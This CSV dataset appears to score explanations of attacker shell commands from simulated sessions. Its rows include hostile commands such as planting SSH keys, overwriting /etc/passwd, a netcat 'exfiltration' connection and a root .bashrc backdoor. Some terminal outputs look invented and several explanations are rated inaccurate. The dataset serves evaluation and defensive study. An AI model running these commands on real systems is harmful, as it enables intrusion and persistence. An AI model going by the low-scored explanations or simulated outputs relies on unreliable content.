Architecture,Session_ID,Tactic,Turn,Command,Terminal_Output,Analyst_Explanation,Accuracy,Groundedness
hybrid,HYB-008-705178,Credential Access,19,"`sudo echo ""123456"" >> ~/.ssh/authorized_keys`","sudo: no password supplied
touch: cannot touch '/home/www-data/.ssh/authorized_keys': Permission denied",The attacker is attempting to gain unauthorized access to a remote system by adding their public key to the authorized_keys file.,3,2
hybrid,HYB-025-A0B232,Collection,1,ls /proc/$$/fd/,"0: cwd
1: rtd
2: txt",The attacker is attempting to enumerate open files and directories within a process's file descriptor table.,5,5
hybrid,HYB-027-22938F,Exfiltration,14,`nc 10.0.2.15 80 > /tmp/exfil.tar`,nc: connect to 10.0.2.15 port 80 (tcp) failed: Connection refused,"The attacker is attempting to establish a TCP connection to a target host on port 80, likely for exfiltration of data.",5,5
hybrid,HYB-018-F5E597,Execution,1,`ls -l /usr/bin/`,"-rwxr-xr-x 1 root root 1234567 Jan 1 1970 /usr/bin/bash
-rwxr-xr-x 1 root root 8765432 Jan 1 1970 /usr/bin/perl
-rwxr-xr-x 1 root root 5678901 Jan 1 1970 /usr/bin/python3",The attacker is attempting to enumerate available executables within the `/usr/bin` directory.,5,5
hybrid,HYB-023-3EEED0,Discovery,20,bash -c 'ls -lR /',"total 0
drwxr-xr-x 2 root root 4096 Jan  1  1970 bin
drwxr-xr-x 2 root root 4096 Jan  1  1970 boot
drwxr-xr-x 2 root root 4096 Jan  1  1970 dev
drwxr-xr-x 1 www-data www-data 4096 Jan  1  1970 etc
drwxr-xr-x 2 root root 4096 Jan  1  1970 home
lrwxrwxrwx 1 root root    3 Jan  1  1970 lib -> /lib/x86_64-linux-gnu
lrwxrwxrwx 1 root root    3 Jan  1  1970 lib32 -> /lib/i386-linux-gnu
lrwxrwxrwx 1 root root    3 Jan  1  1970 lib64 -> /lib/x86_64-linux-gnu
drwxr-xr-x 2 root root 4096 Jan  1  1970 libx32
drwxr-xr-x 2 root root 4096 Jan  1  1970 media
drwxr-xr-x 2 root root 4096 Jan  1  1970 mnt
drwxr-xr-x 2 root root 4096 Jan  1  1970 opt
drwxr-xr-x 2 root root 4096 Jan  1  1970 proc
drwx------ 2 root root 4096 Jan  1  1970 root
drwxr-xr-x 23 root root 4096 Jan  1  1970 run
drwxr-xr-x 2 root root 4096 Jan  1  1970 sbin
drwxr-xr-x 2 root root 4096 Jan  1  1970 srv
drwxr-xr-x 2 root root 4096 Jan  1  1970 sys
drwxrwxrwt 2 root root 4096 Jan  1  1970 tmp
drwxr-xr-x 13 root root 4096 Jan  1  1970 usr
drwxr-xr-x 20 root root 4096 Jan  1  1970 var",The attacker is attempting to enumerate directory contents and identify system files.,5,5
hybrid,HYB-022-F5E230,Credential Access,22,`mv /tmp/ssh-abcde/keypair.pub ~/.ssh/authorized_keys`,"Permission denied, please try again.",The attacker is attempting to move a public SSH key file from a temporary location to a user's authorized_keys directory.,5,5
hybrid,HYB-008-705178,Credential Access,9,`echo '123456' > /etc/passwd`,bash: /etc/passwd: Permission denied,"Attacker attempted to modify the `/etc/passwd` file, which is a critical system file that contains user account information. This action could potentially allow them to gain unauthorized access or control over the system.",3,2
hybrid,HYB-015-0E1864,Reconnaissance,9,ps -ef | grep http,"UID        PID  PPID  C STIME TTY          TIME CMD
apache     1234     1  0 12:34 ?        00:00:01 /usr/sbin/httpd -k start",The attacker is attempting to enumerate running processes related to HTTP services.,5,5
hybrid,HYB-026-9BAB6F,Command and Control,15,"`echo ""I am root"" > /root/.bashrc`",bash: /root/.bashrc: Permission denied,"The attacker attempted to modify a critical system file, potentially gaining root privileges.",2,1
hybrid,HYB-016-51EED1,Resource Development,5,`sudo echo '/tmp/shell.sh' > /root/.bashrc && chmod 777 /root/.bashrc`,bash: /root/.bashrc: Permission denied,"The attacker attempted to execute a command that would modify the root user's shell configuration, potentially granting them elevated privileges.",3,2
